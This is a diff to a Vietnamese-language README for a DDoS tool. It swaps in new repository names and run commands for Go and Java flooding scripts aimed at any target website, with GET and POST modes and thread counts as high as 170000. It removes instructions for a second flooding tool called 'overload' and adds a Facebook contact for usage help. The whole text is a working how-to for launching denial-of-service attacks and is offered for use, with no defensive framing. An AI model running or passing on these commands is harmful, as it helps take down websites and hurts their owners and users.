@@ -13,37 +13,23 @@ sudo apt upgrade
 
 sudo apt install golang
 # Lệnh Vào Tool
-git clone https://github.com/Xuan-QuyenDepzaivailon/free-ddos
+git clone https://github.com/Xuan-QuyenDepzaivailon/ddosby-xquyen
 
-cd free-ddos
+cd ddosby-xquyen
 # Chế độ Get sài cho web https://
-go run ddosbyxq.go https://linkweb.com 2000 get 5000 nil
+go run freeddos.go https://linkweb.com 2000 get 5000 nil
 # Chế độ Post xài cho web http://
-go run ddosbyxq.go https://linkweb.com 2000 post 5000 header.txt
-# Java DDoS siêu bá cân all web :))
+go run freeddos.go https://linkweb.com 2000 post 5000 header.txt
+# Java DDoS Free
 
-java ddosbyxq.java
+java freeddos.java
 
 Link web:
 
 Thread: 170000
 
 Method: 4000
-# Overload DDoS
-pkg install python3 python3-pip git -y
+# Java DDoS Vip
+java vipddos.java
 
-git clone https://github.com/7zx/overload
-
-cd overload
-
-pip3 install -r requirements.txt
-
-python3 overload.py
-
-├───Cách Nhập
-
-├───TIME:1000
-
-└───THREADS:20000
-
-└───URL:link web
+Cách sài ib fb: https://m.facebook.com/dv.xuanquyen
